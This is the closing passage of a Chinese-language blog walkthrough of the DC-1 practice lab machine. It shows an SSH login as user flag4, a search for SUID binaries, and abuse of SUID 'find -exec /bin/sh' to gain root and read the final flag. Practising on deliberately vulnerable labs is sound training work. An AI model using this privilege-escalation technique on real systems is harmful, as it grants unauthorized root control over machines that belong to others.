class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC1<span class="comment"># ssh flag4@192.168.1.3</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.1.3 (192.168.1.3)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:89B+YqcNl4cSf/BZk26MQG1QeW4BvBlVENMbTRhVhsU.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? y</span></span><br><span class="line"><span class="string">Please type &#x27;</span>yes<span class="string">&#x27;, &#x27;</span>no<span class="string">&#x27; or the fingerprint: yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.1.3<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">flag4@192.168.1.3&#x27;</span>s password: </span><br><span class="line">Linux DC-1 3.2.0-6-486 <span class="comment">#1 Debian 3.2.102-1 i686</span></span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">flag4@DC-1:~$</span><br></pre></td></tr></table></figure><p><code>查看文件，得到flag4</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">flag4@DC-1:~$ </span><br><span class="line">flag4@DC-1:~$ </span><br><span class="line">flag4@DC-1:~$ cat flag4.txt </span><br><span class="line">Can you use this same method to find or access the flag <span class="keyword">in</span> root?</span><br><span class="line"></span><br><span class="line">Probably. But perhaps it<span class="string">&#x27;s not that easy.  Or maybe it is?</span></span><br><span class="line"><span class="string">flag4@DC-1:~$ </span></span><br></pre></td></tr></table></figure><p><code>根据提示，你能用相同方法找到root的吗？或许很难，但也不一定</code></p><p><code>尝试cd到root用户下，结果失败，接下来提权</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ <span class="built_in">cd</span> /root/</span><br><span class="line">-bash: <span class="built_in">cd</span>: /root/: Permission denied</span><br><span class="line">flag4@DC-1:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x10-提权"><a href="#0x10-提权" class="headerlink" title="0x10.提权"></a>0x10.提权</h2><blockquote><p>查看系统命令当中是否有SUID标识。</p><p>SUID标识为在命令执行时将短暂获得root权限，通过具有SUID标识的命令运行bash，这时bash就有root权限。</p><p>root信任SUID，SUID信任bash，bash就有了root权限</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null   // 查看具有SUID的命令</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ find / -perm -4000 2&gt;/dev/null</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/bin/ping6</span><br><span class="line">/bin/umount</span><br><span class="line">/usr/bin/at</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/procmail</span><br><span class="line">/usr/bin/find</span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/lib/pt_chown</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/sbin/mount.nfs</span><br><span class="line">flag4@DC-1:~$ </span><br></pre></td></tr></table></figure><p><code>发现find就可以</code></p><p><code>下面进行利用</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ find /root -<span class="built_in">exec</span> <span class="string">&quot;whoami&quot;</span> \; </span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">root</span><br><span class="line">flag4@DC-1:~$ </span><br></pre></td></tr></table></figure><p><code>可以发现为root</code></p><p><code>提权</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag4@DC-1:~$ find /root -<span class="built_in">exec</span> <span class="string">&quot;/bin/bash&quot;</span> \;      </span><br><span class="line">bash-4.2$ id</span><br><span class="line">uid=1001(flag4) gid=1001(flag4) groups=1001(flag4)</span><br><span class="line">bash-4.2$ </span><br></pre></td></tr></table></figure><p><code>e翻车了！再换个方法</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bash-4.2$ find /root -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;    </span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=1001(flag4) gid=1001(flag4) euid=0(root) groups=0(root),1001(flag4)</span><br><span class="line"><span class="comment"># </span></span><br></pre></td></tr></table></figure><p><code>成功了😭</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pwd</span></span><br><span class="line">/home/flag4</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">thefinalflag.txt</span><br><span class="line"><span class="comment"># cat thefinalflag.txt</span></span><br><span class="line">Well <span class="keyword">done</span>!!!!</span><br><span class="line"></span><br><span class="line">Hopefully you<span class="string">&#x27;ve enjoyed this and learned some new skills.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">You can let me know what you thought of this little journey</span></span><br><span class="line"><span class="string">by contacting me via Twitter - @DCAU7</span></span><br><span class="line"><span class="string"># </span></span><br></pre></td></tr></table></figure><h2 id="0x11-接下来就是擦屁股走人了，干不动了。。。"><a href="#0x11-接下来就是擦屁股走人了，干不动了。。。" class="headerlink" title="0x11.接下来就是擦屁股走人了，干不动了。。。"></a>0x11.接下来就是擦屁股走人了，干不动了。。。</h2></div><div><div><div style="text-align:center;color:#000;font-size:20px">-------------纸短情长<i class="fa fa-paw"></i>下次再见-------------</div></div></div><div class="reward-container"><div>加个赞赏，万一有好心人呢~</div><button onclick='document.querySelector(".post-reward").classList.toggle("active")'>谢谢你请我吃辣条!</button><div class="post-reward"><div><img src="/images/wechatpay.jpg" alt="Lluna 微信"> <span>微信</span></div><div><img src="/images/alipay.jpg" alt="Lluna 支付宝"> <span>支付宝</span></div></div></div><div><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者： </strong>Lluna</li><li class="post-copyright-link"><strong>本文链接：</strong> <a href="https://lunamoore.github.io/2020/08/21/DC-1/" title="DC-1">https://lunamoore.github.io/2020/08/21/DC-1/</a></li><li class="post-copyright-license"><strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请标注链接及作者！</li></ul></div><div class="followme"><span>欢迎关注我的公众号</span><div class="social-list"><div class="social-item"><a target="_blank" class="social-link" href="/images/gzh.jpg"><span class="icon"><i class="fab fa-weixin"></i> </span><span class="label">WeChat</span></a></div></div></div><footer class="post-footer"><div class="post-tags"><a href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag"><i class="fa fa-tag"></i> 靶机</a></div><div class="post-nav"><div class="post-nav-item"><a href="/2020/08/19/hackthebox%E6%B3%A8%E5%86%8C/" rel="prev" title="HackTheBox注册"><i class="fa fa-chevron-left"></i> HackTheBox注册</a></div><div class="post-nav-item"><a href="/2020/08/21/DC-2/" rel="next" title="DC-2">DC-2 <i class="fa fa-chevron-right"></i></a></div></div></footer></article><div class="comments" id="valine-comments"></div><script>window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }</script></div></main><footer class="footer"><div class="footer-inner"><div class="copyright">&copy; 2020 – <span itemprop="copyrightYear">2022</span> <span class="with-love"><i class="fa fa-heart"></i> </span><span class="author" itemprop="copyrightHolder">Lluna</span></div><div class="wordcount"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-chart-line"></i> </span><span>站点总字数：</span> <span title="站点总字数">709k</span> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="fa fa-coffee"></i> </span><span>站点阅读时长 &asymp;</span> <span title="站点阅读时长">10:44</span></span></div><span id="sitetime"></span><script language="javascript">function siteTime(){window.setTimeout("siteTime()",1e3);var e=36e5,t=24*e,o=new Date,i=o.getFullYear(),a=o.getMonth()+1,n=o.getDate(),r=o.getHours(),l=o.getMinutes(),s=o.getSeconds(),M=Date.UTC(2020,8,14,15,0,0),g=Date.UTC(i,a,n,r,l,s)-M,m=Math.floor(g/31536e6),T=Math.floor(g/t-365*m),f=Math.floor((g-(365*m+T)*t)/e),h=Math.floor((g-(365*m+T)*t-f*e)/6e4),u=Math.floor((g-(365*m+T)*t-f*e-6e4*h)/1e3);document.getElementById("sitetime").innerHTML="小站已运行"+m+" 年 "+T+" 天 "+f+" 小时 "+h+" 分钟 "+u+" 秒"}siteTime()</script><div class="busuanzi-count"><span class="post-meta-item" id="busuanzi_container_site_uv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-user"></i> </span><span class="site-uv" title="总访客量"><span id="busuanzi_value_site_uv"></span> </span></span><span class="post-meta-item" id="busuanzi_container_site_pv" style="display:none"><span class="post-meta-item-icon"><i class="fa fa-eye"></i> </span><span class="site-pv" title="总访问量"><span id="busuanzi_value_site_pv"></span></span></span></div><script color="0,0,0" opacity="0.7" zindex="-1" count="300" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script></div></footer><script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script><script src="//cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script>!function(){var t=document.createElement("script"),e=window.location.protocol.split(":")[0];t.src="https"===e?"https://zz.bdstatic.com/linksubmit/push.js":"http://push.zhanzhang.baidu.com/push.js";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(t,s)}()</script><script src="/js/local-search.js"></script><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>NexT.utils.loadComments('#valine-comments', () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', () => {
    new Valine(Object.assign({
      el  : '#valine-comments',
      path: location.pathname,
    }, {"enable":true,"appId":"8hPlmJu758GqGb8p9gI7IWIH-gzGzoHsz","appKey":"EBvPjdspqOEm800591erwHwx","placeholder":"ヾﾉ≧∀≦)o来了老弟!","avatar":"wavatar","meta":["nick","mail","link"],"pageSize":10,"lang":null,"visitor":true,"comment_count":true,"recordIP":false,"serverURLs":null,"enableQQ":false,"requiredFields":[]}
    ));
  }, window.Valine);
});</script><script type="text/javascript" src="/js/love.js"></script></body></html>